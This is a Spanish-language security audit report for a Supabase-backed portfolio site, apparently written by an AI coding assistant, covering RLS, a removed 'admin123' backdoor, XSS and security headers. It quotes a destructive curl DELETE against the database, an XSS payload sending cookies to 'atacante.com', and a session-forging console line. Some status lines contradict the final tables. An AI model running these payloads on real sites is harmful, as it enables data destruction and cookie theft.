# Auditoría de seguridad — Portfolio Ariel.Dev

**Fecha:** 2 de agosto de 2026
**Alcance:** infraestructura, backend (Supabase) y frontend (Vite + JS vanilla)
**Estado del arreglo:** 9 de 12 hallazgos corregidos en código. 3 requieren acción tuya en el panel de Supabase y en el hosting.

---

## Resumen en 30 segundos

El riesgo real de este proyecto **no estaba en el código, sino en la base de datos**. El panel de administración se defendía con una pantalla de contraseña en el navegador, y una pantalla en el navegador no es un control de acceso: se puede saltear sin tocarla.

Hallazgo más grave: si las tablas de Supabase no tienen RLS activo, **cualquier persona puede borrar o modificar todos tus proyectos con un solo comando**, sin pasar nunca por tu panel. La clave que lo permite está publicada en el JavaScript del sitio, y eso es normal — lo que falta es la política del lado del servidor.

Segundo hallazgo: había una contraseña maestra (`admin123`) escrita en el código fuente que se publica.

| Severidad | Cantidad | Estado |
|---|---|---|
| Crítica | 3 | **3 cerradas** |
| Alta | 4 | **4 cerradas** |
| Media | 5 | 4 cerradas · 1 abierta (FUNC-01, formulario de contacto) |

### Estado final verificado — 2 de agosto de 2026

| Verificación | Resultado |
|---|---|
| RLS activo en `projects` y `categories` | Sí |
| Policies de escritura | Atadas al UID del admin. Ninguna con `cmd = ALL` |
| Registro público de usuarios | Desactivado |
| Usuarios en `auth.users` | Solo el admin. Sin intrusos |
| Cabeceras de seguridad (securityheaders.com) | **A+** (antes: F) |
| `script-src` de la CSP | `'self'` — sin scripts de terceros |
| Backdoor `admin123` | Eliminado y desplegado |
| Variables de entorno en Vercel | Cargadas y verificadas |

---

## Aclaración sobre "puertos y accesos"

Pediste un análisis de puertos. Corresponde ser preciso: **este proyecto no tiene superficie de red propia que auditar.**

Es un sitio estático desplegado en hosting compartido. No administrás un servidor, no hay SSH, no hay firewall bajo tu control, no hay puertos que abrir o cerrar. El proveedor expone únicamente 80 y 443 y gestiona esa capa.

La superficie de ataque real está en otro lado:

| Superficie | Puerto/Protocolo | Quién lo controla | Estado |
|---|---|---|---|
| Sitio estático | 443 (HTTPS) | Tu proveedor de hosting | Falta forzar HTTPS y cabeceras → resuelto con `.htaccess` / `_headers` |
| API REST de Supabase | 443 → `*.supabase.co` | **Vos, vía políticas RLS** | **Abierto a escritura pública si RLS está apagado (CRIT-01)** |
| Supabase Auth | 443 → `*.supabase.co` | Supabase | Correcto, pero se saltaba desde el frontend (CRIT-02) |
| Vite dev server | 5173 (local) | Tu máquina | Solo local. No exponer a la red (ver más abajo) |
| Live Server (VS Code) | 5501 (local) | Tu máquina | Solo local |

**El "puerto" que importa acá es el 443 de tu proyecto Supabase**, y está abierto a escritura para cualquiera hasta que apliques `supabase/rls-policies.sql`.

Sobre el puerto de desarrollo: Vite escucha solo en `localhost` por defecto, lo cual es correcto. Nunca lo levantes con `--host` en una red WiFi pública o compartida: eso expone tu proyecto y tus variables de entorno a cualquiera en esa red.

---

## Hallazgos

### CRIT-01 · Escritura pública sin restricción en la base de datos
**Estado: REQUIERE TU ACCIÓN — es lo primero que tenés que hacer**

`js/projects.js` ejecuta `insert`, `update` y `delete` sobre las tablas `projects` y `categories` directamente desde el navegador, usando la clave anon.

Esa clave viaja dentro del bundle público. Cualquiera la lee con Ctrl+U. Eso **no es un error en sí**: la clave anon es pública por diseño. El problema es que sin políticas RLS, esa clave pública tiene permisos de escritura.

Traducción concreta: alguien puede ejecutar esto desde una terminal, sin conocer tu contraseña ni abrir tu panel:

```bash
curl -X DELETE 'https://<proyecto>.supabase.co/rest/v1/projects?id=neq.0' \
     -H "apikey: <tu_clave_anon>" -H "Authorization: Bearer <tu_clave_anon>"
```

Y perdés todo el portfolio.

Peor aún, combinado con el renderizado del sitio, el atacante podía insertar un proyecto cuyo título fuera código JavaScript, que se ejecutaría en el navegador de **cada visitante** de tu web (XSS almacenado). Esa segunda mitad ya está cerrada (ver HIGH-01), pero el borrado y la inyección de contenido siguen abiertos hasta que apliques RLS.

**Cómo arreglarlo:** abrí `supabase/rls-policies.sql`, copiá todo, pegalo en el SQL Editor de Supabase y ejecutalo. El script incluye un diagnóstico previo, las políticas y una prueba con `curl` para verificar que quedó bien cerrado. **Hacé la prueba, no asumas.**

---

### CRIT-02 · Contraseña maestra escrita en el código público
**Estado: CORREGIDO**

En `js/app.js` existía:

```js
if (!isConfigured && password === "admin123") {
    sessionStorage.setItem("admin_logged_in", "true");
```

Esa contraseña se publicaba en texto plano dentro del JavaScript del sitio. Cualquiera que abriera el código fuente la encontraba.

Eliminada por completo. El único camino de acceso ahora es Supabase Auth, con verificación de que exista un `access_token` real firmado por el servidor.

---

### CRIT-03 · La sesión de administrador se podía falsificar desde la consola
**Estado: CORREGIDO**

El acceso al panel se concedía si existía esta marca:

```js
sessionStorage.getItem("admin_logged_in") === "true"
```

`sessionStorage` es almacenamiento del navegador del visitante. Cualquiera podía abrir la consola (F12), escribir una línea y entrar al panel:

```js
sessionStorage.setItem("admin_logged_in", "true")
```

Sin contraseña. Sin email. Sin dejar rastro.

Corregido: la única fuente de verdad es ahora la sesión firmada por Supabase. Ningún valor de `sessionStorage` o `localStorage` concede acceso, porque ese almacenamiento lo controla el usuario, no vos. Se agregó además cierre de sesión real (`signOut()`), que invalida el token del lado del servidor.

> **El principio detrás de esto:** todo lo que se ejecuta en el navegador está bajo control de quien lo visita. El frontend puede ocultar botones por comodidad, pero la autorización siempre tiene que verificarse en el servidor. Por eso CRIT-01 sigue siendo el hallazgo más importante aunque este ya esté corregido.

---

### HIGH-01 · XSS almacenado en el renderizado de proyectos
**Estado: CORREGIDO**

Los datos de la base se insertaban en el DOM sin escapar:

```js
<h3 class="stack-card-title">${proj.title}</h3>
<a href="${proj.demoUrl}">
```

Un título como `<img src=x onerror="fetch('https://atacante.com?c='+document.cookie)">` se ejecutaba en el navegador de cada visitante. Y con CRIT-01 abierto, cualquiera podía escribir ese título.

Corregido en los 9 puntos de inyección: tarjetas de proyecto, filtros, listas del panel, categorías, adicionales del cotizador y el PDF de presupuesto. Se creó `js/security.js` con:

- `escapeHtml()` — neutraliza los caracteres que rompen el contexto HTML.
- `safeUrl()` — solo permite `http`, `https`, `mailto`, `tel`. Bloquea `javascript:` en enlaces de demo.
- `safeImageSrc()` — bloquea SVG con contenido activo y `data:` que no sea imagen real.

Validado contra 14 payloads de ataque reales: los 14 quedaron neutralizados.

---

### HIGH-02 · Sin cabeceras de seguridad HTTP
**Estado: CORREGIDO — falta que despliegues**

El sitio no enviaba ninguna cabecera de seguridad. Sin CSP, sin HSTS, sin protección contra clickjacking.

Creados tres archivos, usá el que corresponda a tu hosting:

- `public/.htaccess` → **Hostinger y cualquier Apache** (tu caso)
- `public/_headers` → Netlify / Cloudflare Pages
- `vercel.json` → Vercel

Incluyen CSP, HSTS, `X-Frame-Options`, `nosniff`, `Referrer-Policy`, `Permissions-Policy` y reglas de caché.

La CSP es la más valiosa: convierte un XSS que se escape de las validaciones en un error de consola inofensivo. Es la red de contención debajo de HIGH-01.

> **Precaución con HSTS:** `Strict-Transport-Security` obliga al navegador a usar HTTPS durante 2 años. Activalo **solo con el certificado SSL ya funcionando**. Si el sitio queda sin TLS después, los navegadores se niegan a abrirlo y no hay forma rápida de revertirlo.

**Verificá el resultado en https://securityheaders.com después de desplegar.** Deberías pasar de F a A.

---

### HIGH-03 · Script de terceros sin verificación de integridad
**Estado: CORREGIDO — resuelto eliminando el script**

```html
<script src="https://cdn.jsdelivr.net/gh/studio-freight/lenis@1.0.29/dist/lenis.min.js"></script>
```

Cargado sin atributo `integrity`: si ese CDN fuera comprometido, el código alterado se ejecutaría en tu sitio con acceso total a la página.

Al verificarlo en producción apareció algo más: **el script nunca funcionó**. Lanzaba `ReferenceError: module is not defined` en cada carga. La ruta `cdn.jsdelivr.net/gh/` sirve el archivo crudo del repositorio, que es un build CommonJS incompatible con el navegador.

`app.js` lo envuelve en `if (typeof Lenis !== 'undefined')`, así que el fallo era silencioso: el smooth scroll nunca se inicializó y el sitio venía usando scroll nativo. Nadie lo notó porque no había nada que notar.

Resuelto eliminando el `<script>`. Beneficio adicional: `script-src` de la CSP pasó de `'self' https://cdn.jsdelivr.net` a **`'self'`**. Ningún script de terceros puede ejecutarse en el sitio.

Si querés recuperar el smooth scroll, la forma correcta es como dependencia, no por CDN:

```bash
npm i lenis
```

Importándolo en `app.js` y dejando que Vite lo empaquete: queda fijado en `package-lock.json`, se sirve desde tu dominio, no necesita SRI y la CSP no se toca.

---

### HIGH-04 · Subida de imágenes sin límite ni validación
**Estado: CORREGIDO**

`processFile()` aceptaba cualquier archivo, de cualquier tamaño, y lo guardaba como Base64 en la base de datos. Un archivo de 50 MB se convertía en ~67 MB de texto en una sola fila.

Corregido con validación en tres capas: tipo MIME contra lista blanca, tamaño máximo de 2 MB, y verificación del contenido real del archivo (no solo la extensión). **Los SVG se bloquean explícitamente** porque pueden contener `<script>`.

Se agregaron además restricciones `CHECK` en la base (paso 3 del script SQL), porque la validación del navegador la controla el atacante.

---

### MED-01 · El formulario de contacto simulaba envíos exitosos
**Estado: CORREGIDO**

El formulario mostraba *"Se ha enviado la consulta con éxito"* y no enviaba nada. El mensaje se perdía. No es una vulnerabilidad, pero es peor en la práctica: **perdiste clientes reales creyendo que te habían escrito.**

Corregido: ahora deriva a WhatsApp con el mensaje armado, que sí entrega. Si preferís un formulario real por email, ver FUNC-01 abajo.

---

### MED-02 · `window.opener` expuesto
**Estado: CORREGIDO** — agregado `noopener,noreferrer` en las aperturas de WhatsApp y en los enlaces de demo.

### MED-03 · Enumeración de usuarios en el login
**Estado: CORREGIDO** — el error de Supabase se mostraba tal cual, permitiendo distinguir "email no existe" de "contraseña incorrecta". Ahora el mensaje es genérico y el campo de contraseña se limpia siempre.

### MED-04 · Nombre de archivo del PDF sin sanear
**Estado: CORREGIDO** — el nombre del cliente se insertaba directo en el nombre del archivo. Ahora se filtran caracteres de ruta y se acota a 60 caracteres.

### MED-05 · Artefactos de build y config del editor versionados
**Estado: CORREGIDO** — `dist/` y `.vscode/` estaban en Git pese a figurar en `.gitignore` (se agregaron antes de la regla). Removidos del índice con `git rm --cached`. Como Vite incrusta las variables `VITE_` en el bundle, versionar `dist/` significa versionar una copia de tus claves en cada commit.

`.env` **nunca estuvo en Git** — eso estaba bien hecho.

---

## Estado de secretos

| Ítem | Estado |
|---|---|
| `.env` en Git | Nunca versionado. Correcto. |
| Claves en el historial de Git | Sin coincidencias en el historial completo. |
| `dist/` versionado | Corregido. No contenía claves incrustadas. |
| Clave anon en el bundle | Normal y esperado. Se protege con RLS, no ocultándola. |
| `service_role` key | No aparece en ningún lado. **Nunca la pongas en el frontend:** ignora RLS y da control total. |

**¿Hace falta rotar las claves?** No encontré filtración. Si alguna vez compartiste el `.env` por WhatsApp, mail o captura de pantalla, rotá la clave anon desde *Supabase → Settings → API*. Es gratis y toma un minuto.

---

## Plan de acción priorizado

### Completado el 2 de agosto de 2026

1. ~~Aplicar `supabase/rls-policies.sql`~~ — hecho, con las policies atadas al UID del admin.
2. ~~Desactivar el registro público de usuarios~~ — hecho.
3. ~~Crear el usuario admin en Supabase Auth~~ — hecho.
4. ~~Desplegar cabeceras de seguridad~~ — hecho. Calificación A+.
5. ~~Resolver HIGH-03 (lenis)~~ — hecho, eliminando el script.

### Pendiente

6. **Activar 2FA** en tu cuenta de Supabase, en Vercel y en el registrador del dominio. Hoy es el eslabón más débil: quien entre a cualquiera de esas cuentas se saltea todo lo demás.
7. **FUNC-01** — migrar el formulario de contacto a un endpoint real.
8. **Backups de la base** — ver `MANTENIMIENTO.md`.
9. **`npm audit`** mensual.
10. **Medir PageSpeed** para tener el número de referencia posterior a las optimizaciones.

---

## FUNC-01 · Formulario de contacto real

La derivación a WhatsApp funciona, pero pierde a quien no lo usa. Dos opciones sin montar servidor:

**Formspree** (5 minutos, 50 envíos/mes gratis): creás el formulario en formspree.io y cambiás el `action`. Incluye protección antispam.

**Supabase Edge Function** (más control, sin límite de envíos): una función serverless que recibe el POST y envía el mail con Resend. Requiere agregar rate limiting para evitar abuso — un endpoint público sin límite se convierte en un relay de spam.

Si vas por Formspree, agregá su dominio a `form-action` en la CSP.

---

## Verificación de los cambios aplicados

| Comprobación | Resultado |
|---|---|
| Sintaxis de los 4 módulos JS | OK (`node --check`) |
| Payloads XSS bloqueados | 14 / 14 |
| Backdoor `admin123` en el código | 0 coincidencias |
| Flag `admin_logged_in` en el código | 0 coincidencias |
| `dist/` y `.vscode/` fuera de Git | Confirmado |

**No se hizo commit de ningún cambio.** Tenías trabajo sin commitear en `index.html`, `css/styles.css` y `package.json` antes de esta auditoría; commitear habría mezclado tus cambios con los míos. Revisá con `git diff` y commiteá vos.

**El build con `npm run build` no pudo ejecutarse en este entorno** (falta el binario Linux de Rollup, `node_modules` fue instalado en Windows). La sintaxis está verificada, pero **corré `npm run build` en tu máquina antes de desplegar** y probá: cargar el panel, iniciar sesión, crear un proyecto y descargar un PDF de presupuesto.

---

## Archivos entregados

| Archivo | Qué es |
|---|---|
| `supabase/rls-policies.sql` | **El más importante.** Cierra CRIT-01. |
| `js/security.js` | Utilidades de escape y validación. |
| `public/.htaccess` | Cabeceras para Hostinger/Apache. |
| `public/_headers` | Cabeceras para Netlify/Cloudflare. |
| `vercel.json` | Cabeceras para Vercel. |
| `.env.example` | Plantilla sin secretos. |
| `PERFORMANCE.md` | Análisis de rendimiento medido. |
| `MANTENIMIENTO.md` | Rutina de mantenimiento. |
| `SECURITY.md` | Este documento. |
